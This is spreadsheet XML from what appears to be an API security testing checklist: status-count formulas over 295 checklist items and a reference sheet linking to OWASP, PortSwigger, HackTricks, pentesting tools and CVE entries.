        <v>0</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="28" t="s">
        <v>20</v>
      </c>
      <c r="B8" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$G$4:$G$298,A8)</f>
        <v>8</v>
      </c>
      <c r="C8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A8,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>8</v>
      </c>
      <c r="D8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A8,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A8,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A8,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G8" s="20" t="n">
        <f aca="false">IF((E8+F8)=0,0,F8/(E8+F8))</f>
        <v>0</v>
      </c>
    </row>
    <row r="9" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A9" s="22" t="s">
        <v>1455</v>
      </c>
      <c r="B9" s="22" t="n">
        <f aca="false">SUM(B4:B8)</f>
        <v>295</v>
      </c>
      <c r="C9" s="22" t="n">
        <f aca="false">SUM(C4:C8)</f>
        <v>295</v>
      </c>
      <c r="D9" s="22" t="n">
        <f aca="false">SUM(D4:D8)</f>
        <v>0</v>
      </c>
      <c r="E9" s="22" t="n">
        <f aca="false">SUM(E4:E8)</f>
        <v>0</v>
      </c>
      <c r="F9" s="22" t="n">
        <f aca="false">SUM(F4:F8)</f>
        <v>0</v>
      </c>
      <c r="G9" s="23" t="n">
        <f aca="false">IF((E9+F9)=0,0,F9/(E9+F9))</f>
        <v>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70"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="3" min="3" style="0" width="20"/>
  </cols>
  <sheetData>
    <row r="1" customFormat="false" ht="24.45" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A1" s="1" t="s">
        <v>1458</v>
      </c>
      <c r="B1" s="1"/>
      <c r="C1" s="1"/>
    </row>
    <row r="3" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A3" s="29" t="s">
        <v>1459</v>
      </c>
      <c r="B3" s="29" t="s">
        <v>1460</v>
      </c>
      <c r="C3" s="29" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="13" t="s">
        <v>1461</v>
      </c>
      <c r="B4" s="30" t="s">
        <v>1462</v>
      </c>
      <c r="C4" s="13" t="s">
        <v>1463</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="13" t="s">
        <v>1464</v>
      </c>
      <c r="B5" s="30" t="s">
        <v>1465</v>
      </c>
      <c r="C5" s="13" t="s">
        <v>1466</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="13" t="s">
        <v>973</v>
      </c>
      <c r="B6" s="30" t="s">
        <v>1467</v>
      </c>
      <c r="C6" s="13" t="s">
        <v>1468</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="13" t="s">
        <v>1469</v>
      </c>
      <c r="B7" s="30" t="s">
        <v>1470</v>
      </c>
      <c r="C7" s="13" t="s">
        <v>1471</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="13" t="s">
        <v>1472</v>
      </c>
      <c r="B8" s="30" t="s">
        <v>1473</v>
      </c>
      <c r="C8" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="9" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A9" s="13" t="s">
        <v>1475</v>
      </c>
      <c r="B9" s="30" t="s">
        <v>1476</v>
      </c>
      <c r="C9" s="13" t="s">
        <v>1477</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="13" t="s">
        <v>1478</v>
      </c>
      <c r="B10" s="30" t="s">
        <v>1479</v>
      </c>
      <c r="C10" s="13" t="s">
        <v>1480</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="13" t="s">
        <v>1481</v>
      </c>
      <c r="B11" s="30" t="s">
        <v>1482</v>
      </c>
      <c r="C11" s="13" t="s">
        <v>1483</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="13" t="s">
        <v>1484</v>
      </c>
      <c r="B12" s="30" t="s">
        <v>1485</v>
      </c>
      <c r="C12" s="13" t="s">
        <v>1486</v>
      </c>
    </row>
    <row r="13" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A13" s="13" t="s">
        <v>1487</v>
      </c>
      <c r="B13" s="30" t="s">
        <v>1488</v>
      </c>
      <c r="C13" s="13" t="s">
        <v>1477</v>
      </c>
    </row>
    <row r="14" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A14" s="13" t="s">
        <v>1489</v>
      </c>
      <c r="B14" s="30" t="s">
        <v>1490</v>
      </c>
      <c r="C14" s="13" t="s">
        <v>172</v>
      </c>
    </row>
    <row r="15" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A15" s="13" t="s">
        <v>1491</v>
      </c>
      <c r="B15" s="30" t="s">
        <v>1492</v>
      </c>
      <c r="C15" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="16" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A16" s="13" t="s">
        <v>1493</v>
      </c>
      <c r="B16" s="30" t="s">
        <v>1494</v>
      </c>
      <c r="C16" s="13" t="s">
        <v>1468</v>
      </c>
    </row>
    <row r="17" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A17" s="13" t="s">
        <v>1495</v>
      </c>
      <c r="B17" s="30" t="s">
        <v>1496</v>
      </c>
      <c r="C17" s="13" t="s">
        <v>1497</v>
      </c>
    </row>
    <row r="18" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A18" s="13" t="s">
        <v>1498</v>
      </c>
      <c r="B18" s="30" t="s">
        <v>1499</v>
      </c>
      <c r="C18" s="13" t="s">
        <v>1500</v>
      </c>
    </row>
    <row r="19" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A19" s="13" t="s">
        <v>1501</v>
      </c>
      <c r="B19" s="30" t="s">
        <v>1502</v>
      </c>
      <c r="C19" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="20" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A20" s="13" t="s">
        <v>1504</v>
      </c>
      <c r="B20" s="30" t="s">
        <v>1505</v>
      </c>
      <c r="C20" s="13" t="s">
        <v>1506</v>
      </c>
    </row>
    <row r="21" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A21" s="13" t="s">
        <v>1507</v>
      </c>
      <c r="B21" s="30" t="s">
        <v>1508</v>
      </c>
      <c r="C21" s="13" t="s">
        <v>1509</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A22" s="13" t="s">
        <v>1510</v>
      </c>
      <c r="B22" s="30" t="s">
        <v>1511</v>
      </c>
      <c r="C22" s="13" t="s">
        <v>1512</v>
      </c>
    </row>
    <row r="23" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A23" s="13" t="s">
        <v>1513</v>
      </c>
      <c r="B23" s="30" t="s">
        <v>1514</v>
      </c>
      <c r="C23" s="13" t="s">
        <v>1515</v>
      </c>
    </row>
    <row r="24" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A24" s="13" t="s">
        <v>1516</v>
      </c>
      <c r="B24" s="30" t="s">
        <v>1517</v>
      </c>
      <c r="C24" s="13" t="s">
        <v>1518</v>
      </c>
    </row>
    <row r="25" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A25" s="13" t="s">
        <v>1519</v>
      </c>
      <c r="B25" s="30" t="s">
        <v>1520</v>
      </c>
      <c r="C25" s="13" t="s">
        <v>1521</v>
      </c>
    </row>
    <row r="26" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A26" s="13" t="s">
        <v>1522</v>
      </c>
      <c r="B26" s="30" t="s">
        <v>1523</v>
      </c>
      <c r="C26" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="27" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A27" s="13" t="s">
        <v>1524</v>
      </c>
      <c r="B27" s="30" t="s">
        <v>1525</v>
      </c>
      <c r="C27" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="28" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A28" s="13" t="s">
        <v>1527</v>
      </c>
      <c r="B28" s="30" t="s">
        <v>1528</v>
      </c>
      <c r="C28" s="13" t="s">
        <v>1515</v>
      </c>
    </row>
    <row r="29" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A29" s="13" t="s">
        <v>1529</v>
      </c>
      <c r="B29" s="30" t="s">
        <v>1530</v>
      </c>
      <c r="C29" s="13" t="s">
        <v>1531</v>
      </c>
    </row>
    <row r="30" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A30" s="13" t="s">
        <v>1532</v>
      </c>
      <c r="B30" s="30" t="s">
        <v>1533</v>
      </c>
      <c r="C30" s="13" t="s">
        <v>1515</v>
      </c>
    </row>
    <row r="31" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A31" s="13" t="s">
        <v>1534</v>
      </c>
      <c r="B31" s="30" t="s">
        <v>1535</v>
      </c>
      <c r="C31" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="32" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A32" s="13" t="s">
        <v>1536</v>
      </c>
      <c r="B32" s="30" t="s">
        <v>1537</v>
      </c>
      <c r="C32" s="13" t="s">
        <v>1468</v>
      </c>
    </row>
    <row r="33" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A33" s="13" t="s">
        <v>1538</v>
      </c>
      <c r="B33" s="30" t="s">
        <v>1539</v>
      </c>
      <c r="C33" s="13" t="s">
        <v>1468</v>
      </c>
    </row>
    <row r="34" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A34" s="13" t="s">
        <v>1540</v>
      </c>
      <c r="B34" s="30" t="s">
        <v>1541</v>
      </c>
      <c r="C34" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="35" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A35" s="13" t="s">
        <v>1542</v>
      </c>
      <c r="B35" s="30" t="s">
        <v>1543</v>
      </c>
      <c r="C35" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="36" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A36" s="13" t="s">
        <v>1544</v>
      </c>
      <c r="B36" s="30" t="s">
        <v>1545</v>
      </c>
      <c r="C36" s="13" t="s">
        <v>1466</v>
      </c>
    </row>
    <row r="37" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A37" s="13" t="s">
        <v>1546</v>
      </c>
      <c r="B37" s="30" t="s">
        <v>1547</v>
      </c>
      <c r="C37" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="38" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A38" s="13" t="s">
        <v>1548</v>
      </c>
      <c r="B38" s="30" t="s">
        <v>1549</v>
      </c>
      <c r="C38" s="13" t="s">
        <v>1512</v>
      </c>
    </row>
    <row r="39" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A39" s="13" t="s">
        <v>1550</v>
      </c>
      <c r="B39" s="30" t="s">
        <v>1551</v>
      </c>
      <c r="C39" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="40" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A40" s="13" t="s">
        <v>1552</v>
      </c>
      <c r="B40" s="30" t="s">
        <v>1553</v>
      </c>
      <c r="C40" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="41" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A41" s="13" t="s">
        <v>1554</v>
      </c>
      <c r="B41" s="30" t="s">
        <v>1555</v>
      </c>
      <c r="C41" s="13" t="s">
        <v>1474</v>
      </c>
    </row>
    <row r="42" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A42" s="13" t="s">
        <v>1556</v>
      </c>
      <c r="B42" s="30" t="s">
        <v>1557</v>
      </c>
      <c r="C42" s="13" t="s">
        <v>1515</v>
      </c>
    </row>
    <row r="43" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A43" s="13" t="s">
        <v>1558</v>
      </c>
      <c r="B43" s="30" t="s">
        <v>1559</v>
      </c>
      <c r="C43" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="44" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A44" s="13" t="s">
        <v>1560</v>
      </c>
      <c r="B44" s="30" t="s">
        <v>1561</v>
      </c>
      <c r="C44" s="13" t="s">
        <v>1562</v>
      </c>
    </row>
    <row r="45" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A45" s="13" t="s">
        <v>1563</v>
      </c>
      <c r="B45" s="30" t="s">
        <v>1564</v>
      </c>
      <c r="C45" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="46" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A46" s="13" t="s">
        <v>1565</v>
      </c>
      <c r="B46" s="30" t="s">
        <v>1566</v>
      </c>
      <c r="C46" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="47" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A47" s="13" t="s">
        <v>1567</v>
      </c>
      <c r="B47" s="30" t="s">
        <v>1568</v>
      </c>
      <c r="C47" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="48" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A48" s="13" t="s">
        <v>1569</v>
      </c>
      <c r="B48" s="30" t="s">
        <v>1570</v>
      </c>
      <c r="C48" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="49" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A49" s="13" t="s">
        <v>1571</v>
      </c>
      <c r="B49" s="30" t="s">
        <v>1572</v>
      </c>
      <c r="C49" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="50" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A50" s="13" t="s">
        <v>1573</v>
      </c>
      <c r="B50" s="30" t="s">
        <v>1574</v>
      </c>
      <c r="C50" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="51" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A51" s="13" t="s">
        <v>1575</v>
      </c>
      <c r="B51" s="30" t="s">
        <v>1576</v>
      </c>
      <c r="C51" s="13" t="s">
        <v>1577</v>
      </c>
    </row>
    <row r="52" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A52" s="13" t="s">
        <v>1578</v>
      </c>
      <c r="B52" s="30" t="s">
        <v>1579</v>
      </c>
      <c r="C52" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="53" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A53" s="13" t="s">
        <v>1580</v>
      </c>
      <c r="B53" s="30" t="s">
        <v>1581</v>
      </c>
      <c r="C53" s="13" t="s">
        <v>1526</v>
      </c>
    </row>
    <row r="54" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A54" s="13" t="s">
        <v>1582</v>
      </c>
      <c r="B54" s="30" t="s">
        <v>1583</v>
      </c>
      <c r="C54" s="13" t="s">
        <v>1584</v>
      </c>
    </row>
    <row r="55" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A55" s="13" t="s">
        <v>1585</v>
      </c>
      <c r="B55" s="30" t="s">
        <v>1502</v>
      </c>
      <c r="C55" s="13" t="s">
        <v>1503</v>
      </c>
    </row>
    <row r="56" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A56" s="13" t="s">
        <v>1586</v>
      </c>
      <c r="B56" s="30" t="s">
        <v>1587</v>
      </c>
      <c r="C56" s="13" t="s">
        <v>1588</v>
      </c>
    </row>
    <row r="57" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A57" s="13" t="s">
        <v>1589</v>
      </c>
      <c r="B57" s="30" t="s">
        <v>1590</v>
      </c>
      <c r="C57" s="13" t="s">
        <v>1588</v>
      </c>
    </row>
    <row r="58" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A58" s="13" t="s">
        <v>1591</v>
      </c>
      <c r="B58" s="30" t="s">
        <v>1592</v>
      </c>
      <c r="C58" s="13" t="s">
        <v>1500</v>
      </c>
    </row>
    <row r="59" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A59" s="13" t="s">
        <v>1593</v>
      </c>
      <c r="B59" s="30" t="s">
        <v>1594</v>
      </c>
      <c r="C59" s="13" t="s">
        <v>1595</v>
      </c>
    </row>
    <row r="60" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A60" s="13" t="s">
        <v>1596</v>
      </c>
      <c r="B60" s="30" t="s">
        <v>1597</v>
      </c>
      <c r="C60" s="13" t="s">
        <v>1598</v>
      </c>
    </row>
    <row r="61" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A61" s="13" t="s">
        <v>1599</v>
      </c>
      <c r="B61" s="30" t="s">
        <v>1600</v>
      </c>
      <c r="C61" s="13" t="s">
        <v>1477</v>
      </c>
    </row>
    <row r="62" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A62" s="13" t="s">
        <v>1601</v>
      </c>
      <c r="B62" s="30" t="s">
        <v>1602</v>
      </c>
      <c r="C62" s="13" t="s">
        <v>1483</v>
      </c>
    </row>
    <row r="63" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A63" s="13" t="s">
        <v>1603</v>
      </c>
      <c r="B63" s="30" t="s">
        <v>1604</v>
      </c>
      <c r="C63" s="13" t="s">
        <v>1598</v>
      </c>
    </row>
    <row r="64" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A64" s="13" t="s">
        <v>1605</v>
      </c>
      <c r="B64" s="30" t="s">
        <v>1606</v>
      </c>
      <c r="C64" s="13" t="s">
        <v>1607</v>
      </c>
    </row>
    <row r="65" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A65" s="13" t="s">
        <v>1608</v>
      </c>
      <c r="B65" s="30" t="s">
        <v>1609</v>
      </c>
      <c r="C65" s="13" t="s">
        <v>1466</v>
      </c>
    </row>
    <row r="66" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A66" s="13" t="s">
        <v>1610</v>
      </c>
      <c r="B66" s="30" t="s">
        <v>1611</v>
      </c>
      <c r="C66" s="13" t="s">
        <v>1468</v>
      </c>
    </row>
    <row r="67" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A67" s="13" t="s">
        <v>1612</v>
      </c>
      <c r="B67" s="30" t="s">
        <v>1613</v>
      </c>
      <c r="C67" s="13" t="s">
        <v>1614</v>
      </c>
    </row>
    <row r="68" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A68" s="13" t="s">
        <v>1615</v>
      </c>
      <c r="B68" s="30" t="s">
        <v>1616</v>
      </c>
      <c r="C68" s="13" t="s">
        <v>1614</v>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="A1:C1"/>
  </mergeCells>
  <hyperlinks>
    <hyperlink ref="B4" r:id="rId1" display="https://owasp.org/www-project-api-security/"/>
    <hyperlink ref="B5" r:id="rId2" display="https://cheatsheetseries.owasp.org/cheatsheets/gRPC_Security_Cheat_Sheet.html"/>
    <hyperlink ref="B6" r:id="rId3" location="websockets" display="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets"/>
    <hyperlink ref="B7" r:id="rId4" display="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html"/>
    <hyperlink ref="B8" r:id="rId5" display="https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"/>
    <hyperlink ref="B9" r:id="rId6" display="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"/>
    <hyperlink ref="B10" r:id="rId7" display="https://portswigger.net/research/http1-must-die"/>
    <hyperlink ref="B11" r:id="rId8" display="https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local"/>
    <hyperlink ref="B12" r:id="rId9" display="https://portswigger.net/research/gotta-cache-em-all"/>
    <hyperlink ref="B13" r:id="rId10" display="https://portswigger.net/research/browser-powered-desync-attacks"/>
    <hyperlink ref="B14" r:id="rId11" display="https://portswigger.net/web-security/jwt"/>
    <hyperlink ref="B15" r:id="rId12" display="https://portswigger.net/web-security/graphql"/>
    <hyperlink ref="B16" r:id="rId13" display="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"/>
    <hyperlink ref="B17" r:id="rId14" display="https://portswigger.net/research/practical-web-cache-poisoning"/>
    <hyperlink ref="B18" r:id="rId15" display="https://portswigger.net/web-security/prototype-pollution/server-side"/>
    <hyperlink ref="B19" r:id="rId16" display="https://github.com/portswigger/http-request-smuggler"/>
    <hyperlink ref="B20" r:id="rId17" display="https://bishopfox.com/blog/json-interoperability-vulnerabilities"/>
    <hyperlink ref="B21" r:id="rId18" display="https://github.com/BishopFox/json-interop-vuln-labs"/>
    <hyperlink ref="B22" r:id="rId19" display="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting"/>
    <hyperlink ref="B23" r:id="rId20" display="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"/>
    <hyperlink ref="B24" r:id="rId21" display="https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover"/>
    <hyperlink ref="B25" r:id="rId22" display="https://salt.security/blog"/>
    <hyperlink ref="B26" r:id="rId23" display="https://escape.tech/blog/"/>
    <hyperlink ref="B27" r:id="rId24" display="https://escape.tech/blog/api-security-checklist/"/>
    <hyperlink ref="B28" r:id="rId25" display="https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf"/>
    <hyperlink ref="B29" r:id="rId26" display="https://www.ibm.com/think/topics/xml-signature-wrapping"/>
    <hyperlink ref="B30" r:id="rId27" display="https://www.wiz.io/academy/application-security/server-side-request-forgery"/>
    <hyperlink ref="B31" r:id="rId28" display="https://www.wiz.io/academy/api-security/api-security-checklist"/>
    <hyperlink ref="B32" r:id="rId29" display="https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/"/>
    <hyperlink ref="B33" r:id="rId30" display="https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/"/>
    <hyperlink ref="B34" r:id="rId31" display="https://www.apisec.ai/blog/graphql-security-testing-guide"/>
    <hyperlink ref="B35" r:id="rId32" display="https://www.apisec.ai/blog/complete-api-penetration-testing-checklist"/>
    <hyperlink ref="B36" r:id="rId33" display="https://www.levo.ai/resources/blogs/grpc-api-testing"/>
    <hyperlink ref="B37" r:id="rId34" display="https://www.levo.ai/resources/blogs/api-security-testing-checklist-2026"/>
    <hyperlink ref="B38" r:id="rId35" display="https://www.redfoxsec.com/blog/web-api-pentesting-a-practical-guide-to-finding-and-exploiting-api-vulnerabilities"/>
    <hyperlink ref="B39" r:id="rId36" display="https://wesecureapp.com/blog/the-only-api-penetration-testing-checklist-you-need/"/>
    <hyperlink ref="B40" r:id="rId37" display="https://pentesterlab.com/glossary/graphql-batching-attack"/>
    <hyperlink ref="B41" r:id="rId38" display="https://lab.wallarm.com/graphql-batching-attack-2/"/>
    <hyperlink ref="B42" r:id="rId39" display="https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials"/>
    <hyperlink ref="B43" r:id="rId40" display="https://danaepp.com/an-api-security-testing-checklist-with-a-twist"/>
    <hyperlink ref="B44" r:id="rId41" display="https://danaepp.com/weaponizing-api-discovery-metadata"/>
    <hyperlink ref="B45" r:id="rId42" display="https://github.com/intruder-io/autoswagger"/>
    <hyperlink ref="B46" r:id="rId43" display="https://github.com/assetnote/kiterunner"/>
    <hyperlink ref="B47" r:id="rId44" display="https://github.com/nikitastupin/clairvoyance"/>
    <hyperlink ref="B48" r:id="rId45" display="https://github.com/doyensec/inql"/>
    <hyperlink ref="B49" r:id="rId46" display="https://github.com/ticarpi/jwt_tool"/>
    <hyperlink ref="B50" r:id="rId47" display="https://github.com/nxenon/grpc-pentest-suite"/>
    <hyperlink ref="B51" r:id="rId48" display="https://github.com/arainho/awesome-api-security"/>
    <hyperlink ref="B52" r:id="rId49" display="https://github.com/xaferima/API-Pentesting-Checklist"/>
    <hyperlink ref="B53" r:id="rId50" display="https://github.com/shieldfy/API-Security-Checklist"/>
    <hyperlink ref="B54" r:id="rId51" display="https://github.com/riteshs4hu/API-Pentesting-Resources"/>
    <hyperlink ref="B55" r:id="rId52" display="https://github.com/portswigger/http-request-smuggler"/>
    <hyperlink ref="B56" r:id="rId53" display="https://nvd.nist.gov/vuln/detail/CVE-2023-44487"/>
    <hyperlink ref="B57" r:id="rId54" display="https://github.com/advisories/GHSA-prj3-ccx8-p6x4"/>
    <hyperlink ref="B58" r:id="rId55" display="https://arxiv.org/abs/2207.11171"/>
    <hyperlink ref="B59" r:id="rId56" display="https://www.veracode.com/blog/breaking-down-owasp-top-10-api-security-risks-2023-what-changed-2019/"/>
    <hyperlink ref="B60" r:id="rId57" display="https://imagetragick.com"/>
    <hyperlink ref="B61" r:id="rId58" display="https://portswigger.net/web-security/request-smuggling/browser/cl-0"/>
    <hyperlink ref="B62" r:id="rId59" display="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/"/>
    <hyperlink ref="B63" r:id="rId60" display="https://snyk.io/research/zip-slip-vulnerability"/>
    <hyperlink ref="B64" r:id="rId61" display="https://www.vaadata.com/en/blog/api-penetration-testing-objective-methodology-black-box-grey-box-and-white-box-tests/"/>
    <hyperlink ref="B65" r:id="rId62" display="https://www.stackhawk.com/blog/best-practices-for-grpc-security/"/>
    <hyperlink ref="B66" r:id="rId63" display="https://clear-gate.com/blog/websocket-misconfigurations"/>
    <hyperlink ref="B67" r:id="rId64" display="https://nvd.nist.gov/vuln/detail/CVE-2025-32094"/>
    <hyperlink ref="B68" r:id="rId65" display="https://nvd.nist.gov/vuln/detail/CVE-2025-436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2026-05-31T02:17:21Z</dcterms:created>
  <dc:creator>openpyxl</dc:creator>
  <dc:description/>
  <dc:language>en-US</dc:language>
  <cp:lastModifiedBy/>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-31T02:17:21Z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